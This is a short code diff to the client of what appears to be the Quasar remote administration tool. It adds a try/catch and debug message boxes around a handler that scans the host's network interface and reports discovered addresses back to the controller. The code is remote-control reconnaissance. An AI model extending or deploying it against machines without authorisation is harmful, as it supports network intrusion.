@@ -79,12 +79,19 @@ namespace Quasar.Client.Messages
         {
             Task.Run(() =>
             {
-                    MessageBox.Show($"Beginning scan on {message.nic.Name}");
+                MessageBox.Show($"Beginning scan on {message.nic.Name}");
+                try
+                {
                     ScannerHelper.ScanInterfaceAction(message.nic, (addressEntity, nicEntity) =>
                     {
                         client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
                         MessageBox.Show($"Added new network entity: {addressEntity.Address}");
                     }, client);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.ToString());
+                }
             });
         }
 
